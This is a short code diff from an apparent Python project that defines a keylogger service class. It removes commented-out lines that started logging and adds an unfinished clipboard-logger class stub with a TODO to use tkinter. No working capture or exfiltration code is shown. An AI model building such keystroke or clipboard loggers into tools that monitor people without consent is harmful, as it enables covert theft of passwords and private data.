@@ -27,8 +27,8 @@ class KeyLoggerService(KeyLogger):
     def clear_log(self) -> None:
         self.__key_records: list [str] = []
 
-# k = KeyLoggerService()
-# k.start_logging()
 
-# while True:
-#     pass
+# TODO: Implement the ClipBoardLogger class using tkinter (see try.py)
+class ClipBoardLogger(KeyLogger):
+    def __init__(self):
+        self.__clipboard_data: list[str] = []
